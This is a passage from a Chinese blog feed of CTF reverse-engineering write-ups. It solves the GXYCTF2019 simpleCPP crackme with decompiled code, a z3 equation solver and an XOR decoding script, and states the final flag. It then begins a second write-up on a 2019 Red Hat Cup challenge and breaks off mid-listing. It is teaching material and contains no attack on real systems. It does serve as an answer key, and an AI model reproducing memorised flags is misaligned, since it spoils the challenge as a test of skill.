class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// si</span></span><br><span class="line">  __int64 *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// er10</span></span><br><span class="line">  __int64 v8; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">void</span> **v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">void</span> **v10; <span class="comment">// r8</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v12; <span class="comment">// r15</span></span><br><span class="line">  __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  __int64 v14; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v16; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rdi</span></span><br><span class="line">  __int64 *v18; <span class="comment">// r14</span></span><br><span class="line">  __int64 v19; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v20; <span class="comment">// r13</span></span><br><span class="line">  __int64 *v21; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v22; <span class="comment">// r12</span></span><br><span class="line">  __int64 v23; <span class="comment">// r15</span></span><br><span class="line">  __int64 v24; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v25; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v26; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v27; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v28; <span class="comment">// r10</span></span><br><span class="line">  __int64 v29; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v30; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">bool</span> v31; <span class="comment">// dl</span></span><br><span class="line">  __int64 *v32; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v33; <span class="comment">// rdx</span></span><br><span class="line">  __int64 *v34; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v35; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v36; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+20h] [rbp-68h]</span></span><br><span class="line">  <span class="type">void</span> *Block[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v40; <span class="comment">// [rsp+40h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v41; <span class="comment">// [rsp+48h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">0</span>i64;</span><br><span class="line">  v41 = <span class="number">15</span>i64;</span><br><span class="line">  LOBYTE(Block[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  v4 = sub_7FF793A919C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, sub_7FF793A91B90);</span><br><span class="line">  sub_7FF793A919C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Let&#x27;s start our game,Please input your flag:&quot;</span>);</span><br><span class="line">  sub_7FF793A91DE0(<span class="built_in">std</span>::<span class="built_in">cin</span>, Block);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, sub_7FF793A91B90);</span><br><span class="line">  <span class="keyword">if</span> ( v40 - <span class="number">5</span> &gt; <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = sub_7FF793A919C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong input ,no GXY&#123;&#125; in input words&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v35, sub_7FF793A91B90);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = operator new(<span class="number">32u</span>i64);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5 = <span class="number">0</span>i64;</span><br><span class="line">    *(v5 + <span class="number">1</span>) = <span class="number">0</span>i64;</span><br><span class="line">    *(v5 + <span class="number">2</span>) = <span class="number">0</span>i64;</span><br><span class="line">    *(v5 + <span class="number">3</span>) = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v40 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = Block;</span><br><span class="line">      <span class="keyword">if</span> ( v41 &gt;= <span class="number">16</span> )</span><br><span class="line">        v9 = Block[<span class="number">0</span>];</span><br><span class="line">      v10 = &amp;qword_7FF793A96048;</span><br><span class="line">      <span class="keyword">if</span> ( qword_7FF793A96060 &gt;= <span class="number">16</span> )</span><br><span class="line">        v10 = qword_7FF793A96048;</span><br><span class="line">      v6[v8] = *(v9 + v8) ^ *(v10 + v7 % <span class="number">27</span>);</span><br><span class="line">      ++v7;</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 &lt; v40 );</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>i64;</span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( v40 &gt; <span class="number">30</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v40 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v16 = v6;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v17 = *v16 + v11;</span><br><span class="line">    ++v15;</span><br><span class="line">    ++v16;</span><br><span class="line">    <span class="keyword">switch</span> ( v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v14 = v17;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        v13 = v17;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">        v12 = v17;</span><br><span class="line">LABEL_23:</span><br><span class="line">        v17 = <span class="number">0</span>i64;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">        sub_7FF793A919C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;ERRO,out of range&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v17 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; v40 );</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = operator new(<span class="number">0x20</span>ui64);</span><br><span class="line">    *v18 = v14;</span><br><span class="line">    v18[<span class="number">1</span>] = v13;</span><br><span class="line">    v18[<span class="number">2</span>] = v12;</span><br><span class="line">    v18[<span class="number">3</span>] = v11;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  v18 = <span class="number">0</span>i64;</span><br><span class="line">LABEL_28:</span><br><span class="line">  v38 = v18[<span class="number">2</span>];</span><br><span class="line">  v19 = v18[<span class="number">1</span>];</span><br><span class="line">  v20 = *v18;</span><br><span class="line">  v21 = operator new(<span class="number">0x20</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF793A919C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Hi , DO not debug me !&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = v19 &amp; v20;</span><br><span class="line">  *v21 = v19 &amp; v20;</span><br><span class="line">  v23 = v38 &amp; ~v20;</span><br><span class="line">  v21[<span class="number">1</span>] = v23;</span><br><span class="line">  v24 = ~v19;</span><br><span class="line">  v25 = v38 &amp; v24;</span><br><span class="line">  v21[<span class="number">2</span>] = v38 &amp; v24;</span><br><span class="line">  v26 = v20 &amp; v24;</span><br><span class="line">  v21[<span class="number">3</span>] = v26;</span><br><span class="line">  <span class="keyword">if</span> ( v23 != <span class="number">0x11204161012</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v21[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v23 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = v23 | v22 | v25 | v26;</span><br><span class="line">  v28 = v18[<span class="number">1</span>];</span><br><span class="line">  v29 = v18[<span class="number">2</span>];</span><br><span class="line">  v30 = v25 &amp; *v18 | v29 &amp; (v22 | v28 &amp; ~*v18 | ~(v28 | *v18));</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v30 == <span class="number">0x8020717153E3013</span>i64 )</span><br><span class="line">    v31 = v27 == <span class="number">0x3E3A4717373E7F1F</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (v27 ^ v18[<span class="number">3</span>]) == <span class="number">0x3E3A4717050F791F</span>i64 )</span><br><span class="line">    v3 = v31;</span><br><span class="line">  <span class="keyword">if</span> ( (v23 | v22 | v28 &amp; v29) == (~*v18 &amp; v29 | <span class="number">0xC00020130082C0C</span>i64) &amp;&amp; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v32 = sub_7FF793A919C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations!flag is GXY&#123;&quot;</span>);</span><br><span class="line">    v33 = Block;</span><br><span class="line">    <span class="keyword">if</span> ( v41 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v33 = Block[<span class="number">0</span>];</span><br><span class="line">    v34 = sub_7FF793A91FD0(v32, v33, v40);</span><br><span class="line">    sub_7FF793A919C0(v34, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    j_j_free(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF793A919C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong answer!try again&quot;</span>);</span><br><span class="line">    j_j_free(v6);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_43:</span><br><span class="line">  <span class="keyword">if</span> ( v41 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v36 = Block[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v41 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v36 = *(Block[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (Block[<span class="number">0</span>] - v36 - <span class="number">8</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    j_j_free(v36);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 48-49 行可以知道，输入的 flag 就是 block，然后在 76 行，block 被复制给了 v9，又在 82 行和 v10 也就是 qword_7FF793A96048 进行了一次异或，qword_7FF793A96048 点进去发现是 0，觉得不对，然后右键它点击 jump to xref，可以发现是有对它赋值的</p><img src="/2022/07/02/GXYCTF2019-simpleCPP/1.png" class><p>所以 qword_7FF793A96048 就是 “i_will_check_is_debug_or_not” 这个字符串，并且输入的 flag 会和它进行一次异或，所以我们现在要知道的就是这个计算的结果，然后逆运算得出 flag 了。我们继续往下看，发现 v6=v16，v16=v17，v17=v11，v11 又等于 v18 [3]，在 120 行 v11 = v17 &lt;&lt; 8，这里对 v17 进行了位移八位，进行了一个堆叠，所以 v6 就相当于整个 v18 串起来。</p><p>再往下看，168 行有一个 if 语句，条件通过就会通过程序，说明这就是最后的判断条件了，而且判断条件中涉及到了 v18 数组，再看看 145-167 行，这里全是一些赋值语句，最后赋的值也是写出来了的，这些最后全都可以用 v18 [0],v18 [1],v18 [2],v18 [3] 来表示，也就可以组成一个多元一次方程组，求解这个方程组可以用 python 的 z3 模块来求解，通过这样就可以得到 v18 的值了，这样就可以通过异或得到 flag，所以我们现在要做的就是理清这个方程组并解出来，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x,y,z,w=BitVecs(<span class="string">&#x27;x y z w&#x27;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s=Solver()</span><br><span class="line"></span><br><span class="line">s.add((~x)&amp;z==<span class="number">1176889593874</span>)</span><br><span class="line">s.add(((z&amp;~x)|(x&amp;y)|(z&amp;(~y))|(x&amp;(~y)))^w==<span class="number">4483974543195470111</span>)</span><br><span class="line">s.add(((z&amp;~y)&amp;x|z&amp;((x&amp;y)|y&amp;~x|~(y|x)))==<span class="number">577031497978884115</span>)</span><br><span class="line">s.add(((z&amp;~x)|(x&amp;y)|(z&amp;~y)|(x&amp;~y))==<span class="number">4483974544037412639</span>)</span><br><span class="line">s.add(((z&amp;(~x)) | (x&amp;y) | y &amp; z) == (((~x)&amp; z)|<span class="number">864693332579200012</span>))</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s = 0x%x&quot;</span>%(i,m[i].as_long()))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>z3 模块如何使用可以参考这个博客：<a href="https://blog.csdn.net/lilongsy/article/details/108568646">python z3 库学习_小龙在山东的博客 - CSDN 博客_python z3 库</a></p><p>结果如下：</p><p>y = 0xc00020130082c0c<br>x = 0x3e3a460533286f0d<br>w = 0x32310600<br>z = 0x8020717153e3013</p><p>有了 v18 之后，我们就可以解 flag 了，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;i_will_check_is_debug_or_not&quot;</span></span><br><span class="line">b =[<span class="number">0x3E</span>,<span class="number">0x3A</span>,<span class="number">0x46</span>,<span class="number">0x05</span>,<span class="number">0x33</span>,<span class="number">0x28</span>,<span class="number">0x6F</span>,<span class="number">0x0D</span>,<span class="number">0x8C</span>,<span class="number">0x00</span>,<span class="number">0x8A</span>,<span class="number">0x09</span>,<span class="number">0x78</span>,<span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x2C</span>,<span class="number">0xAC</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x17</span>,<span class="number">0x15</span>,<span class="number">0x3E</span>,<span class="number">0x30</span>,<span class="number">0x13</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x06</span>]</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    c += <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ b[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>的出来的结果是 &quot;We1l_D0näeéb’ _ólgebra_am_i&quot;，这肯定是不对的，然后在网上看了别人的博客，说是这道题在比赛的时候给出来了中间的部分为 &quot;e!P0or_a&quot;</p><p>所以最后的 flag 为：<strong>flag{We1l_D0ne!P0or_algebra_am_i}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019红帽杯xx</title>
      <link href="/2022/07/01/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFxx/"/>
      <url>/2022/07/01/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFxx/</url>
      
        <content type="html"><![CDATA[<p>这道题的前面一部分我分析不是很清楚，参考了其他大佬的博客才能理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rbx</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int128 *v5; // rax</span><br><span class="line">  __int64 v6; // r11</span><br><span class="line">  __int128 *v7; // r14</span><br><span class="line">  int v8; // edi</span><br><span class="line">  __int128 *v9; // rsi</span><br><span class="line">  char v10; // r10</span><br><span class="line">  int v11; // edx</span><br><span class="line">  __int64 v12; // r8</span><br><span class="line">  unsigned __int64 v13; // rcx</span><br><span class="line">  __int64 v14; // rcx</span><br><span class="line">  unsigned __int64 v15; // rax</span><br><span class="line">  unsigned __int64 i; // rax</span><br><span class="line">  __int64 v17; // rax</span><br><span class="line">  size_t v18; // rsi</span><br><span class="line">  _BYTE *v19; // rbx</span><br><span class="line">  _BYTE *v20; // r9</span><br><span class="line">  int v21; // er11</span><br><span class="line">  char *v22; // r8</span><br><span class="line">  __int64 v23; // rcx</span><br><span class="line">  char v24; // al</span><br><span class="line">  __int64 v25; // r9</span><br><span class="line">  __int64 v26; // rdx</span><br><span class="line">  __int64 v27; // rax</span><br><span class="line">  size_t Size; // [rsp+20h] [rbp-48h] BYREF</span><br><span class="line">  __int128 v30; // [rsp+28h] [rbp-40h] BYREF</span><br><span class="line">  int v31; // [rsp+38h] [rbp-30h]</span><br><span class="line">  int v32; // [rsp+3Ch] [rbp-2Ch]</span><br><span class="line">  int Code[4]; // [rsp+40h] [rbp-28h] BYREF</span><br><span class="line">  int v34; // [rsp+50h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  *Code = 0i64;</span><br><span class="line">  v34 = 0;</span><br><span class="line">  sub_1400018C0(std::cin, argv, Code);</span><br><span class="line">  v3 = -1i64;</span><br><span class="line">  v4 = -1i64;</span><br><span class="line">  do</span><br><span class="line">    ++v4;</span><br><span class="line">  while ( *(Code + v4) );</span><br><span class="line">  if ( v4 != 19 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_140001620(std::cout, &quot;error\n&quot;);</span><br><span class="line">    _exit(Code);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = operator new(5ui64);</span><br><span class="line">  v6 = *&amp;::Code;</span><br><span class="line">  v7 = v5;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = v5;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = *(v9 + Code - v5);</span><br><span class="line">    v11 = 0;</span><br><span class="line">    *v9 = v10;</span><br><span class="line">    v12 = 0i64;</span><br><span class="line">    v13 = -1i64;</span><br><span class="line">    do</span><br><span class="line">      ++v13;</span><br><span class="line">    while ( *(v6 + v13) );</span><br><span class="line">    if ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v10 == *(v6 + v12) )</span><br><span class="line">          break;</span><br><span class="line">        ++v11;</span><br><span class="line">        ++v12;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v11 &lt; v13 );</span><br><span class="line">    &#125;</span><br><span class="line">    v14 = -1i64;</span><br><span class="line">    do</span><br><span class="line">      ++v14;</span><br><span class="line">    while ( *(v6 + v14) );</span><br><span class="line">    if ( v11 == v14 )</span><br><span class="line">      _exit(v6);</span><br><span class="line">    v9 = (v9 + 1);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v9 - v5 &lt; 4 );</span><br><span class="line">  *(v5 + 4) = 0;</span><br><span class="line">  do</span><br><span class="line">    ++v3;</span><br><span class="line">  while ( *(Code + v3) );</span><br><span class="line">  v15 = 0i64;</span><br><span class="line">  v30 = *v7;</span><br><span class="line">  while ( *(&amp;v30 + v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !*(&amp;v30 + v15 + 1) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v15;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !*(&amp;v30 + v15 + 2) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 += 2i64;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !*(&amp;v30 + v15 + 3) )</span><br><span class="line">    &#123;</span><br><span 